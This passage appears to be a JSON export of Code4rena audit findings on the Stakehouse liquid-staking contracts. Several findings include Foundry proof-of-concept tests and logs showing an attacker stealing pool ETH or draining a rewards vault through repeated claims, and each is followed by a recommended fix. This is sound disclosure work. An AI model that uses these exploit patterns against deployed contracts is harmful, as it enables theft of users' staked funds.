0x00;         vm.etch(address(0x123), code);         stakingFundsVaults[0] = address(0x123);         giantFeesAndMevPool.claimRewards(feesAndMevUserTwo, stakingFundsVaults, blsKeysForVaults);         vm.stopPrank();         console.log(\"user one:\", getBalance(feesAndMevUserOne));         console.log(\"user two(attacker):\", getBalance(feesAndMevUserTwo));         console.log(\"giantFeesAndMevPool:\", getBalance(address(giantFeesAndMevPool)));     }      function getBalance(address addr) internal returns (uint){         // giant LP : eth at ratio of 1:1         return addr.balance + giantFeesAndMevPool.lpTokenETH().balanceOf(addr);     }  } ```  run test: ``` forge test --match-test testDWclaimRewards -vvv ```  test log: ``` Logs:   user one: 4000000000000000000   user two(attacker): 6000000000000000000   giantFeesAndMevPool: 6000000000000000000 ``` The attacker stole 2 eth from the pool.  ## Tools Used fodunry  ## Recommended Mitigation Steps Add  ``` idleETH += _amounts[i]; ``` before burnLPTokensForETH in the GiantMevAndFeesPool.bringUnusedETHBackIntoGiantPool function."}, {"title": "GiantMevAndFeesPool.previewAccumulatedETH function: \"accumulated\" variable is not updated correctly in for loop leading to result that is too low", "html_url": "https://github.com/code-423n4/2022-11-stakehouse-findings/issues/160", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-15"], "target": "2022-11-stakehouse-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L82 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L91   # Vulnerability details  ## Impact The `GiantMevAndFeesPool.previewAccumulatedETH` function ([https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L82](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L82)) allows to view the ETH that is accumulated by an address.    However the formula is not correct.    In each iteration of the foor loop, `accumulated` is assigned a new value ([https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L91](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L91)) when actually the value should be updated like this:   ```solidity accumulated += StakingFundsVault(payable(_stakingFundsVaults[i])).batchPreviewAccumulatedETH(         address(this),         _lpTokens[i]     ); ```  Obviously the `accumulated` value must be calculated for all stakingFundVaults not only for one stakingFundsVault.    While this calculation is not used internally by the contract, it will cause any third-party contract that relies on this calculation to behave incorrectly.    For example a third party smart contract might only allow users to withdraw once the value returned by `previewAccumulatedETH` reaches a certain threshold. Because of the issue however the accumulated ETH value that is returned will always be too low.    ## Tools Used VSCode  ## Recommended Mitigation Steps Fix:   ```solidity @@ -88,7 +88,7 @@ contract GiantMevAndFeesPool is ITransferHookProcessor, GiantPoolBase, Syndicate            uint256 accumulated;          for (uint256 i; i < _stakingFundsVaults.length; ++i) { -            accumulated = StakingFundsVault(payable(_stakingFundsVaults[i])).batchPreviewAccumulatedETH( +            accumulated += StakingFundsVault(payable(_stakingFundsVaults[i])).batchPreviewAccumulatedETH(                  address(this),                  _lpTokens[i]              ); ```"}, {"title": "GiantPool batchRotateLPTokens function: Minimum balance for rotating LP Tokens should by dynamically calculated", "html_url": "https://github.com/code-423n4/2022-11-stakehouse-findings/issues/149", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-13"], "target": "2022-11-stakehouse-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantSavETHVaultPool.sol#L127 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L116 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L22   # Vulnerability details  ## Impact The `GiantSavETHVaultPool` and `GiantMevAndFeesPool` both have a `batchRotateLPTokens` function that allows to move staked ETH to another key.    Both functions require that the GiantLP balance of the sender is `>=0.5 ether`.    [https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantSavETHVaultPool.sol#L127](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantSavETHVaultPool.sol#L127)    [https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L116](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L116)    The reason for this is that there is a `common interest` needed in order to rotate LP Tokens.    The way this is implemented right now does not serve this purpose and even makes the functions unable to be called in some cases.    The `MIN_STAKING_AMOUNT` for the GiantPools is `0.001 ether` ([https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L22](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L22)).    So a user should expect that this amount is sufficient to properly use the contract.    However even if there are multiple users paying into the GiantPool, they might not reach the 0.5 ETH threshold to call the function.    So even if they would use some kind of multisig wallet to call the `batchRotateLPTokens` function, it would not be possible.    Also the threshold does not scale.    Imagine that User A puts 100 ETH into the GiantPool. Another User B puts 0.5 ETH into the GiantPool.    Can we speak of \"common interest\" when User B wants to rotate the LP Tokens?    ## Tools Used VSCode  ## Recommended Mitigation Steps My suggestion is to use a formula like:   `require(lpTokenETH.balanceOf(msg.sender) >= (lpTokenETH.totalSupply() / CONSTANT_VALUE))`.   Where you can choose a CONSTANT_VALUE like 20 or 50.    This properly scales the required amount and helps mitigate both scenarios.  "}, {"title": "Incorrect accounting in SyndicateRewardsProcessor results in any LP token holder being able to steal other LP tokens holder's ETH from the fees and MEV vault.", "html_url": "https://github.com/code-423n4/2022-11-stakehouse-findings/issues/147", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-09"], "target": "2022-11-stakehouse-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L63 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L88   # Vulnerability details  ## Impact The SyndicateRewardsProcessor's internal `_distributeETHRewardsToUserForToken()` function is called from external `claimRewards()` function in the `StakingFundsVault` contract. This function is called by LP Token holders to claim their accumulated rewards based on their LP Token holdings and already claimed rewards. The accumulated rewards `due` are calculated as `((accumulatedETHPerLPShare * balance) / PRECISION)` reduced by the previous claimed amount stored in `claimed[_user][_token]`. When the ETH is sent to the `_user` the stored value should be increased by the `due` amount. However in the current code base the `claimed[_user][_token]` is set equal to the calculated `due`.  ```solidity function _distributeETHRewardsToUserForToken(         address _user,         address _token,         uint256 _balance,         address _recipient     ) internal {         require(_recipient != address(0), \"Zero address\");         uint256 balance = _balance;         if (balance > 0) {             // Calculate how much ETH rewards the address is owed / due              uint256 due = ((accumulatedETHPerLPShare * balance) / PRECISION) - claimed[_user][_token];             if (due > 0) {                 claimed[_user][_token] = due;                 totalClaimed += due;                 (bool success, ) = _recipient.call{value: due}(\"\");     ...    }         }     } ```  This means the first time a user will claim their rewards they will get the correct amount and the correct value will be stored in the `claimed[_user][_token]`.  When extra ETH is recieved from the MEV and fees rewards and the user claims their reward again, the claimed amount will only reflect the last claimed amount. As a result they can then repeatedly claim untill the MEV and Fee vault is almost depleted.  ## Proof of Concept Following modification to the existing `StakingFundsVault.t.sol` will provide a test to demonstrate the issue: ```diff diff --git a/test/foundry/StakingFundsVault.t.sol b/test/foundry/StakingFundsVault.t.sol index 53b4ce0..4db8fc8 100644 --- a/test/foundry/StakingFundsVault.t.sol +++ b/test/foundry/StakingFundsVault.t.sol @@ -4,6 +4,7 @@ import \"forge-std/console.sol\";    import { StakingFundsVault } from \"../../contracts/liquid-staking/StakingFundsVault.sol\";  import { LPToken } from \"../../contracts/liquid-staking/LPToken.sol\"; +import { SyndicateRewardsProcessor} from \"../../contracts/liquid-staking/SyndicateRewardsProcessor.sol\";  import {      TestUtils,      MockLSDNFactory, @@ -417,4 +418,73 @@ contract StakingFundsVaultTest is TestUtils {          assertEq(vault.totalClaimed(), rewardsAmount);          assertEq(vault.totalRewardsReceived(), rewardsAmount);      } + +    function testRepetitiveClaim() public { +        // register BLS key with the network +        registerSingleBLSPubKey(accountTwo, blsPubKeyFour, accountFive); + +        vm.label(accountOne, \"accountOne\"); +        vm.label(accountTwo, \"accountTwo\"); +        // Do a deposit of 4 ETH for bls pub key four in the fees and mev pool +        depositETH(accountTwo, maxStakingAmountPerValidator / 2, getUint256ArrayFromValues(maxStakingAmountPerValidator / 2), getBytesArrayFromBytes(blsPubKeyFour)); +        depositETH(accountOne, maxStakingAmountPerValidator / 2, getUint256ArrayFromValues(maxStakingAmountPerValidator / 2), getBytesArrayFromBytes(blsPubKeyFour)); + +        // Do a deposit of 24 ETH for savETH pool +        liquidStakingManager.savETHVault().depositETHForStaking{value: 24 ether}(blsPubKeyFour, 24 ether); + +        stakeAndMintDerivativesSingleKey(blsPubKeyFour); + +        LPToken lpTokenBLSPubKeyFour = vault.lpTokenForKnot(blsPubKeyFour); + +        vm.warp(block.timestamp + 3 hours); + +        // Deal ETH to the staking funds vault +        uint256 rewardsAmount = 1.2 ether; +        console.log(\"depositing %s wei into the vault.\\n\", rewardsAmount); +        vm.deal(address(vault), rewardsAmount); +        assertEq(address(vault).balance, rewardsAmount); +        assertEq(vault.previewAccumulatedETH(accountOne, vault.lpTokenForKnot(blsPubKeyFour)), rewardsAmount / 2); +        assertEq(vault.previewAccumulatedETH(accountTwo, vault.lpTokenForKnot(blsPubKeyFour)), rewardsAmount / 2); + +        logAccounts(); + +        console.log(\"Claiming rewards for accountOne.\\n\"); +        vm.prank(accountOne); +        vault.claimRewards(accountOne, getBytesArrayFromBytes(blsPubKeyFour)); +        logAccounts(); + +        console.log(\"depositing %s wei into the vault.\\n\", rewardsAmount); +        vm.deal(address(vault), address(vault).balance + rewardsAmount); +        vm.warp(block.timestamp + 3 hours); +        logAccounts(); + +        console.log(\"Claiming rewards for accountOne.\\n\"); +        vm.prank(accountOne); +        vault.claimRewards(accountOne, getBytesArrayFromBytes(blsPubKeyFour)); +        logAccounts(); + +        console.log(\"Claiming rewards for accountOne AGAIN.\\n\"); +        vm.prank(accountOne); +        vault.claimRewards(accountOne, getBytesArrayFromBytes(blsPubKeyFour)); +        logAccounts(); + +        console.log(\"Claiming rewards for accountOne AGAIN.\\n\"); +        vm.prank(accountOne); +        vault.claimRewards(accountOne, getBytesArrayFromBytes(blsPubKeyFour)); +        logAccounts(); + +        //console.log(\"Claiming rewards for accountTwo.\\n\"); +        vm.prank(accountTwo); +        vault.claimRewards(accountTwo, getBytesArrayFromBytes(blsPubKeyFour)); + +    } + +    function logAccounts() internal { +        console.log(\"accountOne previewAccumulatedETH : %i\", vault.previewAccumulatedETH(accountOne, vault.lpTokenForKnot(blsPubKeyFour))); +        console.log(\"accountOne claimed               : %i\", SyndicateRewardsProcessor(vault).claimed(accountOne, address(vault.lpTokenForKnot(blsPubKeyFour)))); +        console.log(\"accountTwo previewAccumulatedETH : %i\", vault.previewAccumulatedETH(accountTwo, vault.lpTokenForKnot(blsPubKeyFour))); +        console.log(\"accountTwo claimed               : %i\", SyndicateRewardsProcessor(vault).claimed(accountTwo, address(vault.lpTokenForKnot(blsPubKeyFour)))); +        console.log(\"ETH Balances: accountOne: %i, accountTwo: %i, vault: %i\\n\", accountOne.balance, accountTwo.balance, address(vault).balance); +    } +  }  ```  Note that the AccountOne repeatedly claims until the vault is empty and the claim for accountTwo fails.  Following is an output of the test script showing the balances and differnet state variables: ``` forge test -vv --match testRepetitiveClaim [\u2811] Compiling... No files changed, compilation skipped  Running 1 test for test/foundry/StakingFundsVault.t.sol:StakingFundsVaultTest [FAIL. Reason: Failed to transfer] testRepetitiveClaim() (gas: 3602403) Logs:   depositing 1200000000000000000 wei into the vault.    accountOne previewAccumulatedETH : 600000000000000000   accountOne claimed               : 0   accountTwo previewAccumulatedETH : 600000000000000000   accountTwo claimed               : 0   ETH Balances: accountOne: 0, accountTwo: 0, vault: 1200000000000000000    Claiming rewards for accountOne.    accountOne previewAccumulatedETH : 0   accountOne claimed               : 600000000000000000   accountTwo previewAccumulatedETH : 600000000000000000   accountTwo claimed               : 0   ETH Balances: accountOne: 600000000000000000, accountTwo: 0, vault: 600000000000000000    depositing 1200000000000000000 wei into the vault.    accountOne previewAccumulatedETH : 600000000000000000   accountOne claimed               : 600000000000000000   accountTwo previewAccumulatedETH : 1200000000000000000   accountTwo claimed               : 0   ETH Balances: accountOne: 600000000000000000, accountTwo: 0, vault: 1800000000000000000    Claiming rewards for accountOne.    accountOne previewAccumulatedETH : 600000000000000000   accountOne claimed               : 600000000000000000   accountTwo previewAccumulatedETH : 1200000000000000000   accountTwo claimed               : 0   ETH Balances: accountOne: 1200000000000000000, accountTwo: 0, vault: 1200000000000000000    Claiming rewards for accountOne AGAIN.    accountOne previewAccumulatedETH : 600000000000000000   accountOne claimed               : 600000000000000000   accountTwo previewAccumulatedETH : 1200000000000000000   accountTwo claimed               : 0   ETH Balances: accountOne: 1800000000000000000, accountTwo: 0, vault: 600000000000000000    Claiming rewards for accountOne AGAIN.    accountOne previewAccumulatedETH : 600000000000000000   accountOne claimed               : 600000000000000000   accountTwo previewAccumulatedETH : 1200000000000000000   accountTwo claimed               : 0   ETH Balances: accountOne: 2400000000000000000, accountTwo: 0, vault: 0   Test result: FAILED. 0 passed; 1 failed; finished in 15.64ms  Failing tests: Encountered 1 failing test in test/foundry/StakingFundsVault.t.sol:StakingFundsVaultTest [FAIL. Reason: Failed to transfer] testRepetitiveClaim() (gas: 3602403)  Encountered a total of 1 failing tests, 0 tests succeeded  ```  ## Tools Used Manual review / forge test  ## Recommended Mitigation Steps  The `SyndicateRewardsProcessor` contract should be modified as follows: ```diff diff --git a/contracts/liquid-staking/SyndicateRewardsProcessor.sol b/contracts/liquid-staking/SyndicateRewardsProcessor.sol index 81be706..9b9c502 100644 --- a/contracts/liquid-staking/SyndicateRewardsProcessor.sol +++ b/contracts/liquid-staking/SyndicateRewardsProcessor.sol @@ -60,7 +60,7 @@ abstract contract SyndicateRewardsProcessor {              // Calculate how much ETH rewards the address is owed / due               uint256 due = ((accumulatedETHPerLPShare * balance) / PRECISION) - claimed[_user][_token];              if (due > 0) { -                claimed[_user][_token] = due; +                claimed[_user][_token] += due;                    totalClaimed += due;    ```"}, {"title": "Attacker can grift syndicate staking by staking a small amount", "html_url": "https://github.com/code-423n4/2022-11-stakehouse-findings/issues/146", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-12"], "target": "2022-11-stakehouse-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/a0558ed7b12e1ace1fe5c07970c7fc07eb00eebd/contracts/liquid-staking/LiquidStakingManager.sol#L882 https://github.com/code-423n4/2022-11-stakehouse/blob/23c3cf65975cada7fd2255a141b359a6b31c2f9c/contracts/syndicate/Syndicate.sol#L22   # Vulnerability details  ## Impact `LiquidStakingManager._autoStakeWithSyndicate` always stakes a fixed amount of 12 ETH. However, `Syndicate.stake` only allows a total staking amount of 12 ETH and reverts otherwise: ```solidity if (_sETHAmount + totalStaked > 12 ether) revert InvalidStakeAmount(); ``` An attacker can abuse this and front-run calls to `mintDerivatives` (which call `_autoStakeWithSyndicate` internally). Because `Syndicate.stake` can be called by everyone, he can stake the minimum amount (1 gwei) such that the `mintDerivatives` call fails.  ## Proof Of Concept As soon as there is a `mintDerivatives` call in the mempool, an attacker (that owns sETH) calls `Syndicate.stake` with an amount of 1 gwei. `_autoStakeWithSyndicate` will still call `Syndicate.stake` with 12 ether. However, `_sETHAmount + totalStaked > 12 ether` will then be true, meaning that the call will revert.  ## Recommended Mitigation Steps Only allow staking through the LiquidStakingManager, i.e. add access control to `Syndicate.stake`."}, {"title": "Banned BLS public keys can still be registered", "html_url": "https://github.com/code-423n4/2022-11-stakehouse-findings/issues/144", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-11"], "target": "2022-11-stakehouse-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/a0558ed7b12e1ace1fe5c07970c7fc07eb00eebd/contracts/liquid-staking/LiquidStakingManager.sol#L469   # Vulnerability details  ## Impact In `registerBLSPublicKeys`, it should be checked (according to the comment and error) if a BLS public key is part of the LSD network and not banned: ```solidity // check if the BLS public key is part of LSD network and is not banned require(isBLSPublicKeyPartOfLSDNetwork(_blsPublicKey) == false, \"BLS public key is banned or not a part of LSD network\"); ``` However, this is not actually checked. The function `isBLSPublicKeyPartOfLSDNetwork` only checks if the public key is part of the LSD network: ```solidity function isBLSPublicKeyPartOfLSDNetwork(bytes calldata _blsPublicKeyOfKnot) public virtual view returns (bool) {         return smartWalletOfKnot[_blsPublicKeyOfKnot] != address(0); } ``` The function `isBLSPublicKeyBanned` would perform both checks and should be called here: ```solidity function isBLSPublicKeyBanned(bytes calldata _blsPublicKeyOfKnot) public virtual view returns (bool) {         return !isBLSPublicKeyPartOfLSDNetwork(_blsPublicKeyOfKnot) || bannedBLSPublicKeys[_blsPublicKeyOfKnot] != address(0); } ```  Because of that, it is possible to pass banned BLS public keys to `registerBLSPublicKeys` and the call will succeed.  ## Recommended Mitigation Steps Use `isBLSPublicKeyBanned` instead of `isBLSPublicKeyPartOfLSDNetwork`."}, {"title": " Incorrect implementation of the ETHPoolLPFactory.sol#rotateLPTokens let user stakes ETH more than maxStakingAmountPerValidator in StakingFundsVault, and DOS the stake function in LiquidStakingManager", "html_url": "https://github.com/code-423n4/2022-11-stakehouse-findings/issues/132", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "M-10"], "target": "2022-11-stakehouse-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/ETHPoolLPFactory.sol#L76 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L380 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/ETHPoolLPFactory.sol#L122 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/ETHPoolLPFactory.sol#L130 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/ETHPoolLPFactory.sol#L83 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L551 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L940   # Vulnerability details  ## Impact  The user is not able to stake the 32 ETH for validators because the staking fund vault LP total supply exceeds 4 ETHER.  After the smart wallet, staking fund vault and savETH vault has 32 ETH, the user should be able to call:  ```solidity /// @notice Anyone can call this to trigger staking once they have all of the required input params from BLS authentication /// @param _blsPublicKeyOfKnots List of knots being staked with the Ethereum deposit contract (32 ETH sourced within the network) /// @param _ciphertexts List of backed up validator operations encrypted and stored to the Ethereum blockchain /// @param _aesEncryptorKeys List of public identifiers of credentials that performed the trustless backup /// @param _encryptionSignatures List of EIP712 signatures attesting to the correctness of the BLS signature /// @param _dataRoots List of serialized SSZ containers of the DepositData message for each validator used by Ethereum deposit contract function stake(  bytes[] calldata _blsPublicKeyOfKnots,  bytes[] calldata _ciphertexts,  bytes[] calldata _aesEncryptorKeys,  IDataStructures.EIP712Signature[] calldata _encryptionSignatures,  bytes32[] calldata _dataRoots ) external { ```  before the staking, the validation function is called:  ```solidity // check minimum balance of smart wallet, dao staking fund vault and savETH vault _assertEtherIsReadyForValidatorStaking(blsPubKey); ```  which calls:  ```solidity /// @dev Check the savETH vault, staking funds vault and node runner smart wallet to ensure 32 ether required for staking has been achieved function _assertEtherIsReadyForValidatorStaking(bytes calldata blsPubKey) internal view {  address associatedSmartWallet = smartWalletOfKnot[blsPubKey];  require(associatedSmartWallet.balance >= 4 ether, \"Smart wallet balance must be at least 4 ether\");   LPToken stakingFundsLP = stakingFundsVault.lpTokenForKnot(blsPubKey);  require(address(stakingFundsLP) != address(0), \"No funds staked in staking funds vault\");  require(stakingFundsLP.totalSupply() == 4 ether, \"DAO staking funds vault balance must be at least 4 ether\");   LPToken savETHVaultLP = savETHVault.lpTokenForKnot(blsPubKey);  require(address(savETHVaultLP) != address(0), \"No funds staked in savETH vault\");  require(savETHVaultLP.totalSupply() == 24 ether, \"KNOT must have 24 ETH in savETH vault\"); } ```  note that the code requires the total supply of the stakingFundsLP to be equal to 4 ETHER  ```solidity require(stakingFundsLP.totalSupply() == 4 ether, \"DAO staking funds vault balance must be at least 4 ether\"); ```  however, user can call the function rotateLPTokens to mint more than 4 ETHER of the stakingFundsLP because of the incorrect implementation of the ETHPoolLPFactory.sol#rotateLPTokens  note that stakingFundVault inherits from ETHPoolFactory.sol  ```solidity contract StakingFundsVault is     Initializable, ITransferHookProcessor, StakehouseAPI, ETHPoolLPFactory, ```  so user call rotateLPTokens on StakingFundsVault  ```solidity /// @notice Allow users to rotate the ETH from one LP token to another in the event that the BLS key is never staked /// @param _oldLPToken Instance of the old LP token (to be burnt) /// @param _newLPToken Instane of the new LP token (to be minted) /// @param _amount Amount of LP tokens to be rotated/converted from old to new function rotateLPTokens(LPToken _oldLPToken, LPToken _newLPToken, uint256 _amount) public {  require(address(_oldLPToken) != address(0), \"Zero address\");  require(address(_newLPToken) != address(0), \"Zero address\");  require(_oldLPToken != _newLPToken, \"Incorrect rotation to same token\");  require(_amount >= MIN_STAKING_AMOUNT, \"Amount cannot be zero\");  require(_amount <= _oldLPToken.balanceOf(msg.sender), \"Not enough balance\");  require(_oldLPToken.lastInteractedTimestamp(msg.sender) + 30 minutes < block.timestamp, \"Liquidity is still fresh\");  require(_amount + _newLPToken.totalSupply() <= 24 ether, \"Not enough mintable tokens\"); ```  note the line:  ```solidity require(_amount + _newLPToken.totalSupply() <= 24 ether, \"Not enough mintable tokens\"); ```  the correct implementaton should be:  ```solidity require(_amount + _newLPToken.totalSupply() <= maxStakingAmountPerValidator, \"Not enough mintable tokens\"); ```  The 24 ETH is hardcoded, but when the stakingFundsVault.sol is init, the maxStakingAmountPerValidator is set to 4 ETH.  ```solidity /// @dev Initialization logic function _init(LiquidStakingManager _liquidStakingNetworkManager, LPTokenFactory _lpTokenFactory) internal virtual {  require(address(_liquidStakingNetworkManager) != address(0), \"Zero Address\");  require(address(_lpTokenFactory) != address(0), \"Zero Address\");   liquidStakingNetworkManager = _liquidStakingNetworkManager;  lpTokenFactory = _lpTokenFactory;   baseLPTokenName = \"ETHLPToken_\";  baseLPTokenSymbol = \"ETHLP_\";  maxStakingAmountPerValidator = 4 ether; } ```  note the line:  ```solidity maxStakingAmountPerValidator = 4 ether; ```  this parameter maxStakingAmountPerValidator restrict user's ETH deposit amount  ```solidity     /// @dev Internal business logic for processing staking deposits for single or batch deposits function _depositETHForStaking(bytes calldata _blsPublicKeyOfKnot, uint256 _amount, bool _enableTransferHook) internal {  require(_amount >= MIN_STAKING_AMOUNT, \"Min amount not reached\");  require(_blsPublicKeyOfKnot.length == 48, \"Invalid BLS public key\");   // LP token issued for the KNOT  // will be zero for a new KNOT because the mapping doesn't exist  LPToken lpToken = lpTokenForKnot[_blsPublicKeyOfKnot];  if(address(lpToken) != address(0)) {   // KNOT and it's LP token is already registered   // mint the respective LP tokens for the user    // total supply after minting the LP token must not exceed maximum staking amount per validator   require(lpToken.totalSupply() + _amount <= maxStakingAmountPerValidator, \"Amount exceeds the staking limit for the validator\");    // mint LP tokens for the depoistor with 1:1 ratio of LP tokens and ETH supplied   lpToken.mint(msg.sender, _amount);   emit LPTokenMinted(_blsPublicKeyOfKnot, address(lpToken), msg.sender, _amount);  }  else {   // check that amount doesn't exceed max staking amount per validator   require(_amount <= maxStakingAmountPerValidator, \"Amount exceeds the staking limit for the validator\");   ```  note the line:  ```solidity require(_amount <= maxStakingAmountPerValidator, \"Amount exceeds the staking limit for the validator\");  ```  However, such restriction when rotating LP is changed to  ```solidity require(_amount + _newLPToken.totalSupply() <= 24 ether, \"Not enough mintable tokens\"); ```  **so to sum it up:**  When user stakes, the code strictly requires the stakingFundVault LP total supply is equal to 4 ETH:  ```solidity require(stakingFundsLP.totalSupply() == 4 ether, \"DAO staking funds vault balance must be at least 4 ether\"); ```  However, when rotating the LP, the maxStakingAmountPerValidator for staking fund LP becomes 24 ETH, which exceeds 4 ETH (the expected maxStakingAmountPerValidator)  ## Proof of Concept  First we need to add the import in LiquidStakingManager.t.sol  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L12  ```solidity import { MockAccountManager } from \"../../contracts/testing/stakehouse/MockAccountManager.sol\";  import \"../../contracts/liquid-staking/StakingFundsVault.sol\"; import \"../../contracts/liquid-staking/LPToken.sol\"; ```  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L35  **then we add the POC:**  ```solidity function test_rotateLP_Exceed_maxStakingAmountPerValidator_POC() public {   address user = vm.addr(21312);   bytes memory blsPubKeyOne = fromHex(\"94fdc9a61a34eb6a034e343f20732456443a2ed6668ede04677adc1e15d2a24500a3e05cf7ad3dc3b2f3cc13fdc12af5\");  bytes memory blsPubKeyTwo = fromHex(\"9AAdc9a61a34eb6a034e343f20732456443a2ed6668ede04677adc1e15d2a24500a3e05cf7ad3dc3b2f3cc13fdc12af5\");   bytes[] memory publicKeys = new bytes[](2);  publicKeys[0] = blsPubKeyOne;  publicKeys[1] = blsPubKeyTwo;   bytes[] memory signature = new bytes[](2);  signature[0] = \"signature\";  signature[1] = \"signature\";   // user spends 8 ether and register two keys to become the public operator  vm.prank(user);  vm.deal(user, 8 ether);  manager.registerBLSPublicKeys{value: 8 ether}(   publicKeys,   signature,   user  );   // active two keys  MockAccountManager(factory.accountMan()).setLifecycleStatus(blsPubKeyOne, 1);  MockAccountManager(factory.accountMan()).setLifecycleStatus(blsPubKeyTwo, 1);   // deposit 4 ETH for public key one and public key two  StakingFundsVault stakingFundsVault = manager.stakingFundsVault();  stakingFundsVault.depositETHForStaking{value: 4 ether}(blsPubKeyOne, 4 ether);  stakingFundsVault.depositETHForStaking{value: 4 ether}(blsPubKeyTwo, 4 ether);   // to bypass the error: \"Liquidity is still fresh\"  vm.warp(1 days);   // rotate staking amount from public key one to public key two  // LP total supply for public key two exceed 4 ETHER  LPToken LPTokenForPubKeyOne = manager.stakingFundsVault().lpTokenForKnot(blsPubKeyOne);  LPToken LPTokenForPubKeyTwo = manager.stakingFundsVault().lpTokenForKnot(blsPubKeyTwo);  stakingFundsVault.rotateLPTokens(LPTokenForPubKeyOne, LPTokenForPubKeyTwo, 4 ether);   uint256 totalSupply = LPTokenForPubKeyTwo.totalSupply();  console.log(\"total supply of the Staking fund LP exists 4 ETHER.\");  console.log(totalSupply);   // calling TestUtils.sol#stakeSingleBlsPubKey, revert  stakeSingleBlsPubKey(blsPubKeyTwo);  } ```  We run the POC:  ```solidity forge test -vv --match test_rotateLP_Exceed_maxStakingAmountPerValidator_POC ```  the output is:  ```solidity Running 1 test for test/foundry/LiquidStakingManager.t.sol:LiquidStakingManagerTests [FAIL. Reason: DAO staking funds vault balance must be at least 4 ether] test_rotateLP_Exceed_maxStakingAmountPerValidator_POC() (gas: 1510454) Logs:   total supply of the Staking fund LP exists 4 ETHER.   8000000000000000000  Test result: FAILED. 0 passed; 1 failed; finished in 15.73ms  Failing tests: Encountered 1 failing test in test/foundry/LiquidStakingManager.t.sol:LiquidStakingManagerTests [FAIL. Reason: DAO staking funds vault balance must be at least 4 ether] test_rotateLP_Exceed_maxStakingAmountPerValidator_POC() (gas: 1510454) ```  the total supply of the LP exceeds 4 ETH and the transaction precisely reverts in:  ```solidity require(stakingFundsLP.totalSupply() == 4 ether, \"DAO staking funds vault balance must be at least 4 ether\"); ```  ## Tools Used  Manual Review, Foundry  ## Recommended Mitigation Steps  We recommend the project change from  ```solidity require(_amount + _newLPToken.totalSupply() <= 24 ether, \"Not enough mintable tokens\"); ```  to  ```solidity require(_amount + 